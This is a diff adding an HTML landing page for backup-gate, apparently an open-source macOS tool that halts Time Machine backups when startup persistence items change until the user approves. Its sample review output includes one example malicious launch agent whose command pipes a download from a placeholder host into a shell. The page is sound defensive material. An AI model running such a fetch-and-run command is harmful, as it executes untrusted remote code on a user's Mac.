@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>backup-gate: protect Time Machine backups from malware</title>
+<meta name="description" content="Free, open-source tool for macOS. Time Machine backs up only when nothing that runs at startup has changed since you approved it, so hidden malware can't push your last clean backup out of the history.">
+<link rel="canonical" href="https://mermoddity.github.io/backup-gate/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="backup-gate: Time Machine backups that stop when your Mac might be compromised">
+<meta property="og:description" content="Hidden malware gets copied into every hourly backup while Time Machine deletes the oldest, clean ones. backup-gate pauses backups when persistence changes, until you approve.">
+<meta property="og:url" content="https://mermoddity.github.io/backup-gate/">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "backup-gate",
+  "description": "Time Machine backups that pause when macOS persistence points (launch agents, login items, shell startup files, sudoers...) change, until you approve the change.",
+  "applicationCategory": "SecurityApplication",
+  "operatingSystem": "macOS",
+  "softwareVersion": "3.2.0",
+  "license": "https://opensource.org/licenses/MIT",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+  "codeRepository": "https://github.com/mermoddity/backup-gate",
+  "downloadUrl": "https://github.com/mermoddity/backup-gate/releases/latest"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    { "@type": "Question", "name": "Doesn't Time Machine already protect me from malware and ransomware?",
+      "acceptedAnswer": { "@type": "Answer", "text": "Partly. Ransomware that encrypts your files usually can't change the backups already made, which are read-only snapshots. Malware that hides and waits is different: every hourly backup copies it in, and Time Machine deletes the oldest backups when the disk fills up. After a few weeks or months there may be no backup left from before the infection. backup-gate stops backing up at the first sign of new persistence, so the clean backups don't age out." } },
+    { "@type": "Question", "name": "How is backup-gate different from BlockBlock or KnockKnock?",
+      "acceptedAnswer": { "@type": "Answer", "text": "BlockBlock alerts you in real time when something installs persistence. KnockKnock lists what's persistent on your Mac when you run it. Neither touches your backups. backup-gate ties the backups to the same idea: no backup until you've approved what changed. They work well together." } },
+    { "@type": "Question", "name": "Why not just unplug the backup disk?",
+      "acceptedAnswer": { "@type": "Answer", "text": "Do that too: an unplugged disk is the best protection. But a disk you unplug is a disk you forget to plug in, and if malware is already on the Mac, plugging it in and backing up copies the malware too. backup-gate checks before every backup." } },
+    { "@type": "Question", "name": "How often will backup-gate ask me to approve something?",
+      "acceptedAnswer": { "@type": "Answer", "text": "After you install or update apps that add login or background items, Homebrew services or macOS, and after you edit a shell file like .zshrc. Ordinary app updates that don't touch those don't need approval." } },
+    { "@type": "Question", "name": "Does backup-gate work with a network or NAS backup destination?",
+      "acceptedAnswer": { "@type": "Answer", "text": "No. It reads success from the APFS snapshots on the backup disk, which requires a local disk over USB or Thunderbolt." } },
+    { "@type": "Question", "name": "Is backup-gate on the Mac App Store?",
+      "acceptedAnswer": { "@type": "Answer", "text": "No. App Store apps can't install a root LaunchDaemon or read the system's login items. It's a command-line tool, installed with Homebrew or from a GitHub release." } }
+  ]
+}
+</script>
+<style>
+:root {
+  --bg: #fbfbf9; --fg: #1b1d1f; --muted: #5d6268; --line: #dfe1e3; --card: #ffffff;
+  --accent: #1f6feb; --ok: #1a7f37; --bad: #c2410c; --code-bg: #16181b; --code-fg: #e6e7e8;
+  --code-dim: #8b9096; --code-add: #6fd28a; --code-del: #ff8a7a; --code-warn: #ffb85c;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #111315; --fg: #e8e9ea; --muted: #9aa0a6; --line: #2a2e33; --card: #181b1e;
+    --accent: #58a6ff; --ok: #4ac26b; --bad: #f0883e; --code-bg: #0b0c0e;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #111315; --fg: #e8e9ea; --muted: #9aa0a6; --line: #2a2e33; --card: #181b1e;
+  --accent: #58a6ff; --ok: #4ac26b; --bad: #f0883e; --code-bg: #0b0c0e;
+}
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body {
+  margin: 0; background: var(--bg); color: var(--fg);
+  font: 17px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+}
+main { max-width: 760px; margin: 0 auto; padding: 0 16px 64px; }
+header { padding: 56px 0 24px; }
+.kicker { color: var(--muted); font-size: 14px; letter-spacing: .02em; margin: 0 0 12px; }
+h1 { font-size: clamp(30px, 6vw, 44px); line-height: 1.1; margin: 0 0 16px; letter-spacing: -.02em; }
+h2 { font-size: 24px; margin: 56px 0 12px; letter-spacing: -.01em; }
+h3 { font-size: 17px; margin: 24px 0 4px; }
+p { margin: 0 0 14px; }
+.lede { font-size: 19px; color: var(--muted); }
+a { color: var(--accent); }
+code { font: 14px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; background: color-mix(in srgb, var(--fg) 7%, transparent); padding: 1px 5px; border-radius: 4px; }
+pre { background: var(--code-bg); color: var(--code-fg); padding: 16px; border-radius: 10px; overflow-x: auto;
+      font: 13px/1.55 ui-monospace, SFMono-Regular, Menlo, monospace; margin: 0 0 16px; }
+pre code { background: none; padding: 0; font: inherit; }
+.cta { display: flex; flex-wrap: wrap; gap: 10px; margin: 24px 0 0; }
+.btn { display: inline-block; padding: 10px 16px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 15px; border: 1px solid var(--line); color: var(--fg); background: var(--card); }
+.btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+.facts { display: flex; flex-wrap: wrap; gap: 8px 18px; margin: 20px 0 0; padding: 0; list-style: none; color: var(--muted); font-size: 14px; }
+.facts li::before { content: "✓ "; color: var(--ok); }
+figure { margin: 24px 0; padding: 16px 12px; background: var(--card); border: 1px solid var(--line); border-radius: 12px; }
+figcaption { color: var(--muted); font-size: 14px; margin-top: 8px; }
+.tl { width: 100%; max-width: 520px; height: auto; display: block; }
+.tl text { font: 14px -apple-system, BlinkMacSystemFont, sans-serif; fill: var(--muted); }
+.tl .lbl { fill: var(--fg); font-weight: 600; }
+.steps { padding-left: 20px; }
+.steps li { margin-bottom: 8px; }
+.t-dim { color: var(--code-dim); } .t-add { color: var(--code-add); } .t-del { color: var(--code-del); } .t-warn { color: var(--code-warn); }
+.faq h3 { margin-top: 28px; }
+footer { border-top: 1px solid var(--line); margin-top: 64px; padding-top: 20px; color: var(--muted); font-size: 14px; }
+</style>
+</head>
+<body>
+<main>
+<header>
+  <p class="kicker">backup-gate · free and open source · macOS</p>
+  <h1>Time Machine backups that stop when your Mac might be compromised</h1>
+  <p class="lede">Time Machine keeps a limited history. Malware that hides on your Mac gets copied into every hourly backup, while Time Machine deletes the oldest, clean backups to make room. backup-gate pauses backups as soon as something new is set to run at startup, until you approve it.</p>
+  <div class="cta">
+    <a class="btn primary" href="https://github.com/mermoddity/backup-gate#install">Install</a>
+    <a class="btn" href="https://github.com/mermoddity/backup-gate">Read the code on GitHub</a>
+    <a class="btn" href="time-machine-malware.html">Why this matters</a>
+  </div>
+  <ul class="facts">
+    <li>one readable bash script</li><li>no network access</li><li>no dependencies</li><li>MIT license</li>
+  </ul>
+</header>
+
+<h2>The problem</h2>
+<p>Malware that wants to stay on a Mac has to start again after a restart. To do that, it adds itself somewhere macOS runs things automatically: a launch agent, a login item, a line in <code>.zshrc</code>. Then it can stay quiet for weeks.</p>
+<figure>
+  <svg class="tl" viewBox="0 0 400 180" role="img" aria-labelledby="tl-t tl-d">
+    <title id="tl-t">Backup history over time</title>
+    <desc id="tl-d">Without backup-gate, the backups kept after a few months all contain the malware. With backup-gate, backups stop at the infection and the clean ones are kept.</desc>
+    <text x="0" y="16" class="lbl">Time Machine alone</text>
+    <rect x="0" y="26" width="400" height="32" rx="4" fill="none" stroke="var(--line)"/>
+    <rect x="0" y="26" width="150" height="32" rx="4" fill="var(--line)" opacity=".6"/>
+    <text x="8" y="47">deleted when full</text>
+    <rect x="150" y="26" width="58" height="32" fill="var(--ok)" opacity=".35"/>
+    <rect x="208" y="26" width="192" height="32" rx="4" fill="var(--bad)" opacity=".35"/>
+    <text x="216" y="47" style="fill:var(--fg)">all contain the malware</text>
+    <text x="0" y="92" class="lbl">With backup-gate</text>
+    <rect x="0" y="102" width="400" height="32" rx="4" fill="none" stroke="var(--line)"/>
+    <rect x="0" y="102" width="208" height="32" rx="4" fill="var(--ok)" opacity=".35"/>
+    <text x="8" y="123" style="fill:var(--fg)">clean backups kept</text>
+    <text x="216" y="123" style="fill:var(--fg)">paused until you approve</text>
+    <line x1="208" y1="20" x2="208" y2="140" stroke="var(--bad)" stroke-width="2" stroke-dasharray="4 3"/>
+    <text x="208" y="162" text-anchor="middle">infection</text>
+    <text x="0" y="162">older</text>
+    <text x="400" y="162" text-anchor="end">now</text>
+  </svg>
+  <figcaption>When the disk fills up, Time Machine deletes the oldest backups first. Hidden malware is copied into every new one.</figcaption>
+</figure>
+<p>By the time you notice, the backups that are left may all contain the malware. <a href="time-machine-malware.html">How this happens, in detail.</a></p>
+
+<h2>How backup-gate works</h2>
+<ol class="steps">
+  <li>It takes over Time Machine's automatic backups. Every 30 minutes, a small root daemon checks whether a backup is due.</li>
+  <li>Before backing up, it lists everything on the Mac that can run code at startup or grant root: launch agents and daemons, login and background items, shell and SSH startup files, sudoers, cron, privileged helpers, configuration profiles, system extensions, and its own files.</li>
+  <li>If that list matches what you last approved, Time Machine backs up as usual.</li>
+  <li>If anything changed, backups pause and you get a notification. You review the change and approve it, or investigate it. Your older backups stay clean either way.</li>
+</ol>
+<p>Reviewing a change shows what each item is, when it was created, the command it runs and who signed that program, with warnings for the patterns malware uses:</p>
+<pre><code><span class="t-dim">$</span> sudo /usr/local/sbin/backup-gate approve
+3 change(s) since the last approval (2026-11-10 13:48).
+
+<span class="t-add">+ ADDED  </span> <b>Launch agent (user you)</b>: com.example.updater
+           file     /Users/you/Library/LaunchAgents/com.example.updater.plist
+                    created 2026-11-12 17:29, owner you:staff, mode 644
+           runs     /bin/bash -c 'curl -s https://example.invalid/u | sh'
+                    a tool built into macOS: judge this item by the command above
+           <span class="t-warn">! starts bash: what it does depends on the arguments above</span>
+<span class="t-add">+ ADDED  </span> <b>Login item (you)</b>: com.clipy-app.Clipy
+           runs     /Applications/Clipy.app
+                    signed by Developer ID Application: Shunsuke Furubayashi (BBCHAJ584H)
+<span class="t-del">- REMOVED</span> <b>Background daemon (runs as root)</b>: us.zoom.updater.install
+
+Type APPROVE to accept, RAW for the raw diff, or press Return to cancel:</code></pre>
+
+<h2>Why you can trust it</h2>
+<p>backup-gate runs as root, so you shouldn't install it on trust alone. It's one bash script of about 550 lines that you can read before installing. It has no dependencies, downloads nothing and never uses the network. Each release is built by GitHub Actions from a signed tag, with a checksum and a signed build attestation you can verify. <a href="https://github.com/mermoddity/backup-gate#why-trust-it">What it reads and changes</a> · <a href="https://github.com/mermoddity/backup-gate/blob/main/SECURITY.md">Security policy</a></p>
+
+<h2>Install</h2>
+<p>You need a Mac with an admin account and a Time Machine disk connected over USB or Thunderbolt. Homebrew installs work on Apple silicon; on Intel, install from a release.</p>
+<pre><code>brew install mermoddity/backup-gate/backup-gate
+cd "$(brew --prefix)/opt/backup-gate/libexec"
+./install.sh --check      <span class="t-dim"># preflight: no changes, no sudo</span>
+sudo ./install.sh         <span class="t-dim"># install, then approve your Mac's current state</span></code></pre>
+<p>Read <a href="https://github.com/mermoddity/backup-gate#install">the full instructions</a> first, including how to install from a verified release without Homebrew.</p>
+
+<h2>What it doesn't do</h2>
+<p>backup-gate protects your backup history; it doesn't remove malware. Malware that already has root can turn it off. It only watches persistence, so malware that runs once and leaves nothing behind doesn't trigger it, and neither does ransomware changing your documents. Backups wait for you: if you ignore the notifications, they go stale (you're warned after 48 hours). <a href="https://github.com/mermoddity/backup-gate#limits">All the limits.</a></p>
+
+<section class="faq">
+<h2>FAQ</h2>
+<h3>Doesn't Time Machine already protect me from malware and ransomware?</h3>
+<p>Partly. Ransomware that encrypts your files usually can't change the backups already made, which are read-only snapshots. Malware that hides and waits is different: every hourly backup copies it in, and Time Machine deletes the oldest backups when the disk fills up. After a few weeks or months there may be no backup left from before the infection.</p>
+<h3>How is it different from BlockBlock or KnockKnock?</h3>
+<p><a href="https://objective-see.org/products/blockblock.html">BlockBlock</a> alerts you in real time when something installs persistence. <a href="https://objective-see.org/products/knockknock.html">KnockKnock</a> lists what's persistent on your Mac when you run it. Neither touches your backups. backup-gate ties the backups to the same idea. They work well together.</p>
+<h3>Why not just unplug the backup disk?</h3>
+<p>Do that too: an unplugged disk is the best protection. But a disk you unplug is a disk you forget to plug in, and if malware is already on the Mac, plugging it in and backing up copies the malware too.</p>
+<h3>How often will it ask me to approve something?</h3>
+<p>After you install or update apps that add login or background items, Homebrew services or macOS, and after you edit a shell file like <code>.zshrc</code>. Ordinary app updates that don't touch those don't need approval.</p>
+<h3>Does it work with a network or NAS destination?</h3>
+<p>No. It reads success from the APFS snapshots on the backup disk, which requires a local disk over USB or Thunderbolt.</p>
+<h3>Is it on the Mac App Store?</h3>
+<p>No. App Store apps can't install a root LaunchDaemon or read the system's login items. It's a command-line tool.</p>
+</section>
+
+<footer>
+  backup-gate is free software under the MIT license. Source, issues and releases: <a href="https://github.com/mermoddity/backup-gate">github.com/mermoddity/backup-gate</a>.
+</footer>
+</main>
+</body>
+</html>
